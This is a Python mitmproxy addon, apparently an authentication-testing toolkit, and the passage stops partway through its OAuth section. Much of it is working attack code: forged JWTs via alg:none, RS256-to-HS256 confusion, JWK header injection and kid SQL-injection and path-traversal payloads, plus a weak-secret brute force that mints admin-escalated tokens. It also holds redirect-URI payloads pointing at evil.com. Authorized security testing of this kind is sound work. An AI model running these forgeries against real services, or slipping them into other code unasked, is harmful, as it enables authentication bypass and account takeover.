#!/usr/bin/env python3
"""
Durpie v2 - Authentication & Session Testing (Phase 3)
=======================================================

Modules for deep authentication and session security testing.

Phase 3 modules:
    - JWTDeepAnalyzer  : Algorithm confusion, key brute-force, JWK injection, kid attacks
    - SessionAnalyzer  : Entropy analysis, fixation, timeout, concurrent sessions, logout
    - OAuthOIDCTester  : Redirect URI, state param, PKCE, token leakage, scope escalation
    - MFATester        : OTP bypass, rate limiting, MFA fatigue, backup code entropy

Usage as mitmproxy addons:
    mitmdump -s auth_testing.py

Standalone usage:
    from auth_testing import JWTDeepAnalyzer
    analyzer = JWTDeepAnalyzer()
    findings = analyzer.analyze_token("eyJ...", "https://target.com/api/user")
    for f in findings:
        print(f)

WARNING: Only use against systems you own or have explicit written permission to test.
"""

import re
import json
import math
import hmac
import time
import base64
import hashlib
import asyncio
import logging
import secrets
import urllib.parse
from typing import Dict, List, Optional, Tuple
from dataclasses import dataclass, field
from datetime import datetime
from collections import Counter

import aiohttp

logger = logging.getLogger(__name__)

try:
    from mitmproxy import http, ctx
    MITMPROXY_AVAILABLE = True
except ImportError:
    MITMPROXY_AVAILABLE = False

    class _DummyHTTP:
        class HTTPFlow:
            pass

    http = _DummyHTTP()
    ctx = None

# cryptography is imported lazily inside _check_jwk_injection() to avoid
# crashing the module if the native extension is broken/missing.
CRYPTO_AVAILABLE: bool  # assigned below


def _probe_crypto_available() -> bool:
    """Test whether the cryptography library is usable without crashing."""
    import subprocess, sys
    result = subprocess.run(
        [sys.executable, "-c",
         "from cryptography.hazmat.primitives.asymmetric import rsa; "
         "from cryptography.hazmat.backends import default_backend; "
         "rsa.generate_private_key(65537, 512, default_backend()); print('ok')"],
        capture_output=True, timeout=10,
    )
    return result.returncode == 0 and b"ok" in result.stdout


CRYPTO_AVAILABLE = _probe_crypto_available()


# ============================================================
# SHARED HELPERS
# ============================================================

@dataclass
class Finding:
    type: str
    severity: str
    url: str
    detail: str
    evidence: str = ""
    parameter: str = ""
    payload: str = ""
    poc: str = ""
    timestamp: str = field(default_factory=lambda: datetime.now().isoformat())

    def to_dict(self) -> Dict:
        return {k: v for k, v in self.__dict__.items()}

    def __str__(self) -> str:
        parts = [f"[{self.severity}] {self.type}"]
        if self.parameter:
            parts.append(f"param={self.parameter}")
        parts.append(f"url={self.url}")
        if self.detail:
            parts.append(self.detail)
        return " | ".join(parts)


def _b64url_encode(data: bytes) -> str:
    """URL-safe base64 encode without padding."""
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode()


def _b64url_decode(s: str) -> bytes:
    """URL-safe base64 decode, adding padding as needed."""
    padding = 4 - len(s) % 4
    if padding != 4:
        s += "=" * padding
    return base64.urlsafe_b64decode(s)


def _decode_jwt_parts(token: str) -> Optional[Tuple[Dict, Dict, str, str, str]]:
    """
    Decode a JWT token into its component parts.

    Returns (header, payload, header_b64, payload_b64, sig_b64) or None.
    Does NOT verify the signature.
    """
    parts = token.split(".")
    if len(parts) != 3:
        return None
    try:
        header = json.loads(_b64url_decode(parts[0]))
        payload = json.loads(_b64url_decode(parts[1]))
        return header, payload, parts[0], parts[1], parts[2]
    except Exception:
        return None


def _forge_jwt(header: Dict, payload: Dict, secret: bytes = b"") -> str:
    """
    Forge a JWT signed with HMAC-SHA256 (HS256).

    Used for:
    - Algorithm confusion: sign with the RSA public key as HMAC secret
    - Key brute force verification: sign with candidate secret
    - alg:none: call with secret=b"" and alg set to "none"
    """
    alg = header.get("alg", "HS256")
    h_b64 = _b64url_encode(json.dumps(header, separators=(",", ":")).encode())
    p_b64 = _b64url_encode(json.dumps(payload, separators=(",", ":")).encode())
    msg = f"{h_b64}.{p_b64}".encode()

    if alg.lower() == "none":
        return f"{h_b64}.{p_b64}."

    sig = hmac.new(secret, msg, hashlib.sha256).digest()
    return f"{h_b64}.{p_b64}.{_b64url_encode(sig)}"


def _verify_hs256(token: str, secret: bytes) -> bool:
    """Verify an HS256 JWT signature."""
    parts = token.split(".")
    if len(parts) != 3:
        return False
    msg = f"{parts[0]}.{parts[1]}".encode()
    expected_sig = hmac.new(secret, msg, hashlib.sha256).digest()
    try:
        actual_sig = _b64url_decode(parts[2])
        return hmac.compare_digest(expected_sig, actual_sig)
    except Exception:
        return False


def _mitmlog(prefix: str, msg: str, level: str = "info"):
    if MITMPROXY_AVAILABLE and ctx:
        fn = getattr(ctx.log, level, ctx.log.info)
        fn(f"[{prefix}] {msg}")
    else:
        getattr(logger, level if level != "warn" else "warning")(f"[{prefix}] {msg}")


# ============================================================
# JWT DEEP ANALYZER
# ============================================================

class JWTDeepAnalyzer:
    """
    Deep JWT security analysis and exploitation.

    Attacks implemented:
        1. alg:none         - Remove signature verification entirely
        2. Algorithm confusion (RS256→HS256)
                            - If the server uses RS256, forge an HS256 token signed
                              with the server's RSA public key as the HMAC secret.
                              The server verifies RS256 with the public key; if it
                              naively accepts HS256, it will use the public key for
                              HMAC verification — which we can forge.
        3. JWK injection    - Embed an attacker-controlled JWK in the JWT header.
                              If the server trusts the header-embedded key, we control
                              verification entirely. Requires cryptography library.
        4. kid attacks      - The `kid` (Key ID) header selects which key to use.
                              SQL injection or path traversal in `kid` can trick the
                              server into using a known/empty key for verification.
        5. Key brute force  - Try a list of common/weak HS256 secrets.
        6. Claim manipulation - Modify role/admin/sub claims and replay with
                              each forgery technique above.
        7. Expiration bypass  - Set exp to a far-future timestamp.

    Usage:
        analyzer = JWTDeepAnalyzer()
        findings = analyzer.analyze_token(token, url)

        # With a known public key (for RS256→HS256 confusion):
        findings = analyzer.analyze_token(token, url, public_key_pem=pem_bytes)
    """

    # Common weak JWT secrets (used for brute force)
    COMMON_SECRETS = [
        b"secret", b"password", b"123456", b"jwt_secret", b"your-256-bit-secret",
        b"supersecret", b"qwerty", b"admin", b"changeme", b"change_this",
        b"mysecretkey", b"token_secret", b"jwt", b"key", b"secret_key",
        b"jwt_key", b"private_key", b"hs256_secret", b"your-secret", b"my-secret",
        b"shhh", b"", b"test", b"dev", b"development", b"production", b"staging",
        b"null", b"undefined", b"none", b"true", b"false",
        b"1234567890", b"abcdefghij", b"keyboardcat",
        b"aaaaaaaaaaaaaaaa", b"0000000000000000",
        # Application-common defaults
        b"laravel_secret", b"django-insecure", b"flask-secret-key",
        b"express-session-secret", b"rails-secret",
        b"mysecret", b"mysecretkey123", b"mykey", b"myjwtsecret",
    ]

    # kid parameter attack payloads
    # The `kid` header selects which stored key to use for signature verification.
    KID_PAYLOADS = {
        "sql_injection_true": "' OR '1'='1",
        "sql_injection_union": "' UNION SELECT 'hacked'-- -",
        "null_file": "/dev/null",         # HMAC key = b"" (empty file content)
        "null_file_win": "C:/NUL",
        "path_traversal": "../../../dev/null",
        "path_traversal_enc": "%2e%2e%2f%2e%2e%2f%2e%2e%2fdev%2fnull",
        "known_file": "/etc/hostname",    # HMAC key = hostname content
        "empty_string": "",
    }

    def __init__(self, client: aiohttp.ClientSession = None):
        self.findings: List[Finding] = []
        self._seen_tokens = set()

    def _log(self, msg: str):
        _mitmlog("JWT", msg)

    def _warn(self, msg: str):
        _mitmlog("JWT", msg, "warn")

    def analyze_token(self, token: str, url: str,
                      public_key_pem: bytes = None) -> List[Finding]:
        """
        Perform comprehensive JWT analysis on a single token.

        Args:
            token: Raw JWT string (three dot-separated base64url sections).
            url: URL where this token was observed.
            public_key_pem: PEM-encoded RSA public key (optional, enables RS256→HS256).

        Returns:
            List of Finding objects.
        """
        if token in self._seen_tokens:
            return []
        self._seen_tokens.add(token)

        decoded = _decode_jwt_parts(token)
        if not decoded:
            return []

        header, payload, h_b64, p_b64, sig_b64 = decoded
        findings = []

        self._log(f"Analyzing token at {url}: alg={header.get('alg')}, "
                  f"claims={list(payload.keys())}")

        # --- Attack 1: alg:none ---
        findings.extend(self._check_alg_none(header, payload, url))

        # --- Attack 2: Algorithm confusion (RS256 → HS256) ---
        if public_key_pem:
            findings.extend(self._check_algorithm_confusion(header, payload, url, public_key_pem))

        # --- Attack 3: JWK injection ---
        if CRYPTO_AVAILABLE:
            findings.extend(self._check_jwk_injection(header, payload, url))
        else:
            self._log("cryptography library not installed; skipping JWK injection check")

        # --- Attack 4: kid parameter attacks ---
        if "kid" in header:
            findings.extend(self._check_kid_attacks(header, payload, url))

        # --- Attack 5: HS256 brute force ---
        if header.get("alg", "").startswith("HS"):
            findings.extend(self._brute_force_secret(token, header, payload, url))

        # --- Attack 6: Claim manipulation ---
        findings.extend(self._check_claim_manipulation(header, payload, url))

        # --- Informational: structural issues ---
        findings.extend(self._check_structural_issues(header, payload, url))

        for f in findings:
            self.findings.append(f)
        return findings

    def _check_alg_none(self, header: Dict, payload: Dict, url: str) -> List[Finding]:
        """
        Generate forged alg:none tokens.

        The alg:none attack works because some libraries accept unsigned JWTs
        if the header declares `"alg": "none"`. The signature section becomes empty.

        Variants to try: "none", "None", "NONE", "nOnE"
        """
        findings = []
        none_variants = ["none", "None", "NONE", "nOnE", "NoNe"]

        for none_val in none_variants:
            forged_header = {**header, "alg": none_val}
            forged_token = _forge_jwt(forged_header, payload, b"")

            findings.append(Finding(
                type="JWT Forgery Attempt - alg:none",
                severity="CRITICAL",
                url=url,
                detail=(
                    f"Forged JWT with alg={none_val!r}. "
                    "If the server accepts this, it performs no signature verification. "
                    "Test: replace the Authorization header with the forged token."
                ),
                payload=forged_token,
                poc=(
                    f"# Replace your JWT with this forged token:\n"
                    f"Authorization: Bearer {forged_token}\n\n"
                    f"# Decoded header: {json.dumps(forged_header)}\n"
                    f"# Decoded payload: {json.dumps(payload)}"
                ),
            ))

        return findings

    def _check_algorithm_confusion(self, header: Dict, payload: Dict,
                                   url: str, public_key_pem: bytes) -> List[Finding]:
        """
        RS256 → HS256 algorithm confusion attack.

        How it works:
        1. Server uses RS256: signs with RSA private key, verifies with public key.
        2. We forge an HS256 token signed using the RSA PUBLIC key as the HMAC secret.
        3. A vulnerable server switches to HS256 verification and uses the public key
           as the HMAC secret — exactly what we used to sign. Authentication bypassed.

        The public key is often available at /.well-known/jwks.json or /api/keys.
        """
        if not public_key_pem:
            return []

        confused_header = {**header, "alg": "HS256"}
        forged_token = _forge_jwt(confused_header, payload, public_key_pem)

        return [Finding(
            type="JWT Algorithm Confusion (RS256→HS256)",
            severity="CRITICAL",
            url=url,
            detail=(
                "Forged HS256 token signed with the server's RSA public key. "
                "If the server naively accepts HS256 and uses its public key for "
                "verification, this token will pass signature validation."
            ),
            payload=forged_token,
            poc=(
                "# Algorithm confusion attack:\n"
                "# 1. Obtain server's RSA public key from /.well-known/jwks.json\n"
                "# 2. Use the PEM-encoded public key as the HS256 HMAC secret\n"
                "# 3. Send forged token:\n"
                f"Authorization: Bearer {forged_token}"
            ),
        )]

    def _check_jwk_injection(self, header: Dict, payload: Dict,
                              url: str) -> List[Finding]:
        """
        JWK injection attack.

        RFC 7515 defines the `jwk` header parameter as a way to embed the public key
        used for verification. A vulnerable server trusts this embedded key instead of
        its pre-configured keys, letting the attacker control verification entirely.

        We generate a fresh RSA key pair and embed our public key in the header.
        The token is signed with our private key. If the server trusts the `jwk`
        header, it will verify with our public key — and accept the forged token.
        """
        try:
            # Lazy import to avoid crashing the module if the native extension is broken
            from cryptography.hazmat.primitives import hashes as _hashes
            from cryptography.hazmat.primitives.asymmetric import rsa as _rsa
            from cryptography.hazmat.primitives.asymmetric import padding as _pad
            from cryptography.hazmat.backends import default_backend as _backend

            priv_key = _rsa.generate_private_key(
                public_exponent=65537, key_size=2048, backend=_backend()
            )
            pub_key = priv_key.public_key()
            pub_numbers = pub_key.public_numbers()

            def int_to_b64(n: int) -> str:
                length = (n.bit_length() + 7) // 8
                return _b64url_encode(n.to_bytes(length, "big"))

            jwk = {
                "kty": "RSA",
                "use": "sig",
                "alg": "RS256",
                "n": int_to_b64(pub_numbers.n),
                "e": int_to_b64(pub_numbers.e),
            }

            injected_header = {**header, "alg": "RS256", "jwk": jwk}
            h_b64 = _b64url_encode(json.dumps(injected_header, separators=(",", ":")).encode())
            p_b64 = _b64url_encode(json.dumps(payload, separators=(",", ":")).encode())
            msg = f"{h_b64}.{p_b64}".encode()

            sig = priv_key.sign(msg, _pad.PKCS1v15(), _hashes.SHA256())
            forged_token = f"{h_b64}.{p_b64}.{_b64url_encode(sig)}"

            return [Finding(
                type="JWT JWK Header Injection",
                severity="CRITICAL",
                url=url,
                detail=(
                    "Forged JWT with embedded JWK (attacker-controlled public key). "
                    "If the server uses the `jwk` header parameter to select the "
                    "verification key, it will accept tokens we sign with our own key."
                ),
                payload=forged_token,
                poc=(
                    "# JWK injection attack:\n"
                    "# The forged JWT header contains a `jwk` field with an attacker key.\n"
                    "# The token is signed with the matching private key.\n"
                    "# A vulnerable server trusts the embedded JWK for verification.\n"
                    f"Authorization: Bearer {forged_token}"
                ),
            )]

        except Exception as e:
            self._log(f"JWK injection error: {e}")
            return []

    def _check_kid_attacks(self, header: Dict, payload: Dict, url: str) -> List[Finding]:
        """
        `kid` (Key ID) parameter attacks.

        The `kid` header tells the server WHICH key to use for verification.
        If the server uses `kid` in a SQL query without sanitisation:
            SELECT key FROM keys WHERE id = '<kid>'
        SQL injection lets us forge the signing key.

        Path traversal in `kid` can point to a known file (e.g. /dev/null for
        empty content → HMAC with empty key).
        """
        findings = []

        for attack_name, kid_value in self.KID_PAYLOADS.items():
            injected_header = {**header, "kid": kid_value}

            # For /dev/null path traversal: sign with empty key (file content = "")
            if "null" in attack_name or "traversal" in attack_name:
                secret = b""
                detail = (
                    f"kid='{kid_value}' path traversal. If the server reads the key "
                    f"from this path, /dev/null returns empty bytes — making the HMAC "
                    f"secret an empty string that we can forge."
                )
            elif "sql" in attack_name:
                secret = b"hacked"  # matches the UNION injected value
                detail = (
                    f"kid='{kid_value}' SQL injection. If kid is used in a raw SQL "
                    f"query, this may let us control which key row is selected."
                )
            else:
                secret = b""
                detail = f"kid='{kid_value}' — tests empty/null kid handling."

            forged_token = _forge_jwt(injected_header, payload, secret)

            findings.append(Finding(
                type=f"JWT kid Injection ({attack_name})",
                severity="HIGH",
                url=url,
                detail=detail,
                payload=forged_token,
                poc=(
                    f"# kid attack: {attack_name}\n"
                    f"# kid value injected: {kid_value!r}\n"
                    f"# HMAC secret used: {secret!r}\n"
                    f"Authorization: Bearer {forged_token}"
                ),
            ))

        return findings

    def _brute_force_secret(self, token: str, header: Dict, payload: Dict,
                            url: str) -> List[Finding]:
        """
        Brute force weak HS256/HS384/HS512 secrets.

        Many applications leave the default secret unchanged (e.g. "secret",
        "your-256-bit-secret") or use short, guessable values.
        """
        alg = header.get("alg", "HS256")

        for secret in self.COMMON_SECRETS:
            if _verify_hs256(token, secret):
                # Forge a privilege-escalated token as proof
                escalated = dict(payload)
                if "role" in escalated:
                    escalated["role"] = "admin"
                if "admin" in escalated:
                    escalated["admin"] = True
                if "is_admin" in escalated:
                    escalated["is_admin"] = True

                forged = _forge_jwt(header, escalated, secret)

                return [Finding(
                    type="JWT Weak Secret Discovered",
                    severity="CRITICAL",
                    url=url,
                    detail=(
                        f"JWT secret cracked: {secret!r}. "
                        f"Algorithm: {alg}. "
                        f"Attacker can forge arbitrary tokens with this secret."
                    ),
                    evidence=f"secret={secret!r}",
                    payload=forged,
                    poc=(
                        f"# Cracked JWT secret: {secret!r}\n"
                        f"# Privilege-escalated forged token:\n"
                        f"Authorization: Bearer {forged}\n\n"
                        f"# Forge any token with python:\n"
                        f"import hmac, hashlib, base64, json\n"
                        f"secret = {secret!r}\n"
                        f"# ... sign header.payload with HMAC-SHA256"
                    ),
                )]

        return []

    def _check_claim_manipulation(self, header: Dict, payload: Dict,
                                  url: str) -> List[Finding]:
        """
        Identify claims that could grant elevated privileges if manipulated.

        This is an advisory finding — the attacker still needs a valid signature
        (from other attacks above) to exploit this. But it flags the privilege
        surface that exists in the token.
        """
        privilege_claims = {
            "role": ["admin", "administrator", "superuser", "root", "staff", "moderator"],
            "admin": [True, 1, "true", "1", "yes"],
            "is_admin": [True, 1, "true", "1"],
            "scope": ["admin", "write:all", "read:all", "*"],
            "group": ["admins", "administrators", "staff"],
            "type": ["admin", "superuser"],
            "permissions": ["*", "admin"],
            "privilege": ["admin", "super"],
        }

        findings = []
        for claim, escalation_values in privilege_claims.items():
            if claim in payload:
                escalated = dict(payload)
                escalated[claim] = escalation_values[0]
                # Show what a forged token would look like (unsigned = advisory)
                modified_b64 = _b64url_encode(json.dumps(escalated, separators=(",", ":")).encode())
                parts = _forge_jwt(header, escalated, b"UNKNOWN_SECRET").split(".")
                advisory_token = f"{parts[0]}.{modified_b64}.<valid_signature_needed>"

                findings.append(Finding(
                    type="JWT Privilege Escalation Vector",
                    severity="MEDIUM",
                    url=url,
                    detail=(
                        f"Payload contains claim '{claim}={payload[claim]}'. "
                        f"Modifying to '{claim}={escalation_values[0]}' combined with "
                        f"a signature bypass (alg:none, brute force, etc.) would "
                        f"escalate privileges."
                    ),
                    parameter=claim,
                    poc=(
                        f"# Combine with a working signature bypass:\n"
                        f"# Claim to modify: {claim} = {payload[claim]} → {escalation_values[0]}\n"
                        f"# Then re-sign with the cracked secret or use alg:none"
                    ),
                ))

        return findings

    def _check_structural_issues(self, header: Dict, payload: Dict,
                                 url: str) -> List[Finding]:
        """Check for structural JWT security issues (informational)."""
        findings = []
        alg = header.get("alg", "")
        now = time.time()

        # alg:none already in use
        if alg.lower() == "none":
            findings.append(Finding(
                type="JWT Uses alg:none",
                severity="CRITICAL",
                url=url,
                detail="Token already has alg:none — no signature is being verified.",
            ))

        # Weak algorithm
        if alg in ("HS256", "HS384", "HS512"):
            findings.append(Finding(
                type="JWT Symmetric Algorithm",
                severity="LOW",
                url=url,
                detail=(
                    f"Token uses symmetric algorithm {alg}. "
                    "The same secret signs and verifies. If the secret is weak or "
                    "shared with untrusted parties, tokens can be forged."
                ),
            ))

        # No expiration
        if "exp" not in payload:
            findings.append(Finding(
                type="JWT Missing exp Claim",
                severity="LOW",
                url=url,
                detail="Token has no expiration (exp) claim. Stolen tokens are valid forever.",
            ))

        # Expired (but accepted by server — detected at proxy level)
        exp = payload.get("exp")
        if exp and exp < now:
            findings.append(Finding(
                type="JWT Already Expired",
                severity="INFO",
                url=url,
                detail=(
                    f"Token expired at {datetime.fromtimestamp(exp).isoformat()}. "
                    f"If the server accepted this request, it is not enforcing expiration."
                ),
            ))

        # Sensitive data in payload (JWT is only base64, NOT encrypted)
        sensitive_keys = {"password", "passwd", "secret", "key", "credit_card",
                          "ssn", "cvv", "pin", "private"}
        for k in payload:
            if k.lower() in sensitive_keys:
                findings.append(Finding(
                    type="Sensitive Data in JWT Payload",
                    severity="MEDIUM",
                    url=url,
                    detail=(
                        f"Claim '{k}' appears to contain sensitive data. "
                        "JWT payloads are base64-encoded, NOT encrypted — "
                        "anyone who intercepts the token can read all claims."
                    ),
                    parameter=k,
                ))

        # x5u / jku header injection hints (advisory)
        for injectable_header in ("jku", "x5u"):
            if injectable_header in header:
                findings.append(Finding(
                    type=f"JWT {injectable_header.upper()} Header Present",
                    severity="MEDIUM",
                    url=url,
                    detail=(
                        f"Header contains '{injectable_header}' pointing to "
                        f"{header[injectable_header]!r}. "
                        f"If the server fetches and trusts this URL for key material, "
                        f"redirecting it to an attacker-controlled server enables "
                        f"complete token forgery."
                    ),
                    parameter=injectable_header,
                ))

        return findings

    async def fetch_jwks(self, base_url: str) -> Optional[Dict]:
        """
        Attempt to retrieve the JWKS (JSON Web Key Set) from the target.

        Common locations: /.well-known/jwks.json, /jwks, /api/keys, /oauth/jwks
        """
        common_paths = [
            "/.well-known/jwks.json",
            "/.well-known/openid-configuration",
            "/jwks.json",
            "/jwks",
            "/api/keys",
            "/auth/jwks",
            "/oauth/jwks",
        ]
        parsed = urllib.parse.urlparse(base_url)
        origin = f"{parsed.scheme}://{parsed.netloc}"

        try:
            connector = aiohttp.TCPConnector(ssl=False)
            async with aiohttp.ClientSession(connector=connector) as session:
                for path in common_paths:
                    try:
                        async with session.get(
                            f"{origin}{path}",
                            timeout=aiohttp.ClientTimeout(total=8),
                        ) as resp:
                            if resp.status == 200:
                                ct = resp.headers.get("content-type", "")
                                if "json" in ct or path.endswith(".json"):
                                    data = await resp.json(content_type=None)
                                    self._log(f"JWKS found at {origin}{path}")
                                    return data
                    except Exception:
                        continue
        except Exception:
            pass
        return None

    # ---- mitmproxy addon hooks ----

    def request(self, flow: "http.HTTPFlow"):
        auth = flow.request.headers.get("Authorization", "")
        if auth.startswith("Bearer "):
            token = auth.split(" ", 1)[1]
            if re.match(r"^eyJ[A-Za-z0-9-_]+\.eyJ[A-Za-z0-9-_]+\.", token):
                self.analyze_token(token, flow.request.pretty_url)

        for _, value in flow.request.cookies.items():
            if re.match(r"^eyJ[A-Za-z0-9-_]+\.eyJ[A-Za-z0-9-_]+\.", value):
                self.analyze_token(value, flow.request.pretty_url)


# ============================================================
# SESSION ANALYZER
# ============================================================

class SessionAnalyzer:
    """
    Comprehensive session security analyzer.

    Checks:
        1. Entropy analysis  - Is the session token sufficiently random?
                               Low entropy = predictable tokens = session hijacking.
        2. Session fixation  - Does the server issue a NEW session ID after login?
                               If not, an attacker who knows the pre-auth session
                               can ride it after the victim logs in.
        3. Session in URL    - Session IDs in URLs leak via Referer headers and logs.
        4. Cookie security   - Secure, HttpOnly, SameSite attribute checks.
        5. Logout invalidation - Does the server reject the old session after logout?
                               Client-side only logout leaves the server-side session valid.
        6. Concurrent sessions - Does the server allow multiple simultaneous sessions?
        7. Session timeout   - Are inactive sessions eventually invalidated?
    """

    # Minimum acceptable Shannon entropy (bits per character)
    MIN_ENTROPY = 3.5
    # Minimum token length (shorter = less entropy budget)
    MIN_TOKEN_LENGTH = 16

    def __init__(self):
        self.findings: List[Finding] = []
        self._sessions: Dict[str, List[Dict]] = {}   # session_id → request records
        self._pre_login: Dict[str, str] = {}          # host → session_id before login
        self._login_urls: set = set()

    def _log(self, msg: str):
        _mitmlog("Session", msg)

    def _warn(self, msg: str):
        _mitmlog("Session", msg, "warn")

    def _add(self, f: Finding):
        self.findings.append(f)
        self._warn(str(f))

    @staticmethod
    def shannon_entropy(token: str) -> float:
        """
        Calculate Shannon entropy of a string (bits per character).

        A cryptographically random token of length n over an alphabet of k characters
        has entropy approaching log2(k) bits/char. For hex (k=16): max ~4 bits/char.
        For base64url (k=64): max ~6 bits/char.

        Low entropy (< 3.5 bits/char) suggests sequential or predictable IDs.
        """
        if not token:
            return 0.0
        counts = Counter(token)
        length = len(token)
        return -sum(
            (c / length) * math.log2(c / length)
            for c in counts.values()
        )

    @staticmethod
    def charset_analysis(token: str) -> Dict:
        """Analyze the character set of a session token."""
        return {
            "length": len(token),
            "digits_only": token.isdigit(),
            "hex_only": all(c in "0123456789abcdefABCDEF" for c in token),
            "sequential": any(
                str(i) in token for i in range(1000, 1010)
            ),
            "predictable_patterns": bool(re.search(
                r"(user|sess|id|token)\d+", token, re.IGNORECASE
            )),
        }

    def analyze_session_token(self, token: str, url: str) -> List[Finding]:
        """Analyze a session token for entropy and predictability issues."""
        findings = []

        entropy = self.shannon_entropy(token)
        charset = self.charset_analysis(token)

        if len(token) < self.MIN_TOKEN_LENGTH:
            findings.append(Finding(
                type="Short Session Token",
                severity="HIGH",
                url=url,
                detail=(
                    f"Session token is only {len(token)} characters. "
                    f"Minimum recommended: {self.MIN_TOKEN_LENGTH}. "
                    f"Short tokens have limited entropy and are easier to brute force."
                ),
                evidence=f"token_length={len(token)}",
            ))

        if entropy < self.MIN_ENTROPY:
            findings.append(Finding(
                type="Low-Entropy Session Token",
                severity="HIGH",
                url=url,
                detail=(
                    f"Session token has low Shannon entropy: {entropy:.2f} bits/char "
                    f"(minimum recommended: {self.MIN_ENTROPY}). "
                    f"Predictable tokens enable session hijacking via brute force."
                ),
                evidence=f"entropy={entropy:.2f}, token={token[:20]}...",
            ))

        if charset["digits_only"] and len(token) < 12:
            findings.append(Finding(
                type="Numeric-Only Session Token",
                severity="HIGH",
                url=url,
                detail=(
                    f"Session token is purely numeric ({len(token)} digits). "
                    f"This has only {math.log10(10 ** len(token)):.0f} decimal digits "
                    f"of entropy — trivially brute-forceable."
                ),
                evidence=f"token={token[:20]}",
            ))

        if charset["predictable_patterns"]:
            findings.append(Finding(
                type="Predictable Session Token Pattern",
                severity="MEDIUM",
                url=url,
                detail=(
                    "Session token contains predictable patterns (e.g. 'user123', "
                    "'sess456'). Tokens should be random with no embedded metadata."
                ),
                evidence=f"token={token[:30]}",
            ))

        return findings

    def request(self, flow: "http.HTTPFlow"):
        """Track session cookies in requests."""
        url = flow.request.pretty_url
        host = flow.request.host

        # Detect session in URL (bad practice - leaks via Referer/logs)
        if re.search(r"[?&](session|sess|sid|token|PHPSESSID|JSESSIONID)=", url, re.IGNORECASE):
            self._add(Finding(
                type="Session ID Exposed in URL",
                severity="HIGH",
                url=url,
                detail=(
                    "Session ID is in the URL query string. "
                    "This leaks the session via Referer headers, browser history, "
                    "server access logs, and shared links."
                ),
            ))

        # Record pre-login session IDs
        for name, value in flow.request.cookies.items():
            if any(s in name.lower() for s in ["session", "sess", "sid", "token",
                                                 "phpsessid", "jsessionid", "asp.net_sessionid"]):
                # Track session usage
                if value not in self._sessions:
                    self._sessions[value] = []
                self._sessions[value].append({"url": url, "ts": time.time()})

                # Record before login
                if not any(lg in url.lower() for lg in ["/login", "/signin", "/auth"]):
                    self._pre_login.setdefault(host, value)

    def response(self, flow: "http.HTTPFlow"):
        """Analyze session behavior in responses."""
        if not flow.response:
            return

        host = flow.request.host
        url = flow.request.pretty_url
        path = flow.request.path.lower()

        # Parse all Set-Cookie headers
        set_cookies = flow.response.headers.get_all("set-cookie")

        for raw_cookie in set_cookies:
            self._analyze_set_cookie(raw_cookie, host, url)

            # Extract session name and value
            name_value = raw_cookie.split(";")[0]
            if "=" not in name_value:
                continue
            name, value = name_value.split("=", 1)
            name = name.strip()

            is_session = any(s in name.lower() for s in [
                "session", "sess", "sid", "token",
                "phpsessid", "jsessionid", "asp.net_sessionid"
            ])

            if not is_session:
                continue

            # Entropy analysis on new tokens
            if len(value) >= 8:
                new_findings = self.analyze_session_token(value, url)
                for f in new_findings:
                    self._add(f)

            # Session fixation: check if session was regenerated after login
            if any(lp in path for lp in ["/login", "/signin", "/authenticate"]):
                if flow.response.status_code in [200, 302]:
                    pre_session = self._pre_login.get(host)
                    if pre_session and pre_session == value:
                        self._add(Finding(
                            type="Session Fixation",
                            severity="HIGH",
                            url=url,
                            detail=(
                                "Session ID was NOT regenerated after login. "
                                "An attacker who sets a known session ID before login "
                                "(session fixation) can hijack the authenticated session."
                            ),
                            evidence=f"pre_login_session={pre_session[:20]}...",
                        ))

        # Logout invalidation: check response after logout
        if any(lp in path for lp in ["/logout", "/signout", "/logoff"]):
            if flow.response.status_code in [200, 302]:
                # If the server doesn't send Set-Cookie to clear the session, it
                # may only do client-side logout (setting Max-Age=0 is the correct approach)
                has_clear = any(
                    "max-age=0" in c.lower() or "expires=thu, 01 jan 1970" in c.lower()
                    for c in set_cookies
                )
                if not has_clear:
                    self._add(Finding(
                        type="Potential Client-Side Only Logout",
                        severity="MEDIUM",
                        url=url,
                        detail=(
                            "Logout response did not clear the session cookie "
                            "(no Max-Age=0 or past Expires). The server-side session "
                            "may remain valid. Test by replaying the old session token "
                            "after logout."
                        ),
                    ))

    def _analyze_set_cookie(self, raw_cookie: str, host: str, url: str):
        """Check a Set-Cookie header for security attribute issues."""
        lower = raw_cookie.lower()
        name = raw_cookie.split("=")[0].strip()

        is_session = any(s in name.lower() for s in [
            "session", "sess", "sid", "token", "auth", "jwt",
            "phpsessid", "jsessionid", "csrf", "xsrf"
        ])

        issues = []
        if "secure" not in lower:
            issues.append("missing Secure flag (transmittable over HTTP)")
        if "httponly" not in lower:
            issues.append("missing HttpOnly flag (accessible via JavaScript)")
        if "samesite" not in lower:
            issues.append("missing SameSite (CSRF risk)")

        if issues and is_session:
            self._add(Finding(
                type="Insecure Session Cookie",
                severity="MEDIUM",
                url=url,
                detail=(
                    f"Session cookie '{name}' has security issues: "
                    + ", ".join(issues) + "."
                ),
                evidence=raw_cookie[:120],
                parameter=name,
            ))


# ============================================================
# OAUTH / OIDC TESTER
# ============================================================

class OAuthOIDCTester:
    """
    OAuth 2.0 and OpenID Connect security tester.

    Tests:
        1. Redirect URI validation - Can we redirect to an attacker-controlled domain?
           This is the most critical OAuth vulnerability.
        2. State parameter     - Is the `state` parameter present and unpredictable?
           Missing/static state enables CSRF against the OAuth flow.
        3. PKCE                - Is Proof Key for Code Exchange implemented?
           Required to prevent auth code interception attacks.
        4. Token leakage       - Are tokens appearing in URLs, Referer headers, or logs?
        5. Scope escalation    - Can we request broader scopes than intended?
        6. IdP confusion       - Does the application validate the issuer?

    OAuth overview:
        Authorization Code flow:
        1. Client redirects browser to /authorize?response_type=code&redirect_uri=...
        2. User logs in at IdP (identity provider)
        3. IdP redirects to redirect_uri?code=AUTHCODE
        4. Client exchanges code for tokens at /token endpoint
        5. Client uses access token to call API

        Vulnerability: if redirect_uri isn't strictly validated, step 3 can
        send the auth code to an attacker's server.
    """

    # Common OAuth/OIDC endpoint paths to look for
    OAUTH_ENDPOINTS = [
        "/oauth/authorize", "/oauth/token", "/oauth2/authorize", "/oauth2/token",
        "/authorize", "/auth/authorize", "/connect/authorize",
        "/login/oauth/authorize", "/oauth/callback", "/auth/callback",
        "/.well-known/openid-configuration",
    ]

    # Redirect URI bypass payloads
    # These try to escape the allowed domain whitelist
    REDIRECT_URI_ATTACKS = {
        "open_redirect_path": "https://legitimate.com.evil.com/callback",
        "subdomain_confusion": "https://evil.legitimate.com/callback",
        "url_fragment": "https://legitimate.com/callback#@evil.com",
        "path_traversal": "https://legitimate.com/callback/../redirect?url=https://evil.com",
